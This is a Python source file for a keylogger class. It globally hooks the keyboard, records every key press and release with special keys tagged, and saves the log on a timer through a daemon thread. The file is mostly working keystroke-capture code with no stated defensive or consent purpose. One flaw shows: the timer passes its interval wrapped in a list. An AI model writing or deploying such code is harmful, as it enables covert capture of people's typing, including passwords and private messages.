import keyboard
from threading import Timer
import keylogger_logger

class Keylogger:
    def __init__(self, logger: keylogger_logger._AbstractLogger):
        self.logger = logger

        keyboard.hook(callback=self._log_event)

    def __del__(self):
        self.logger.save()

    def save_each(self, seconds):
        self.logger.save()

        timer = Timer(interval=seconds, function=self.save_each, args=[[seconds]])
        timer.daemon = True     # set the thread as daemon (dies when main thread dies)
        timer.start()

        return self

    def _log_event(self, event: keyboard.KeyboardEvent):
        if event.event_type == 'down':
            self._log_keypress(event)
        else:
            self._log_keyrelease(event)

    def _log_keypress(self, event):
        name = event.name
        
        # regular character
        if len(name) == 1:
            self.logger += name
            return

        # not a character, special key (e.g ctrl, alt, etc.)
        if name == 'space':
            # ' ' instead of 'space'
            self.logger += ' '
        elif name == 'enter':
            # add a new line whenever an ENTER is pressed
            self.logger += '[ENTER]\n'
        elif name == 'decimal':
            self.logger += '.'
        else:
            # replace spaces with underscores
            self.logger += '[{}]'.format(name.replace(' ', '_').upper())

    def _log_keyrelease(self, event):
        name = event.name

        # skip regular letters
        if len(name) == 1:
            return
        if name in ['space', 'enter']:
            return

        self.logger += '[{}-RELEASE]'.format(name.replace(' ', '_').upper())

    def wait(self):
        keyboard.wait()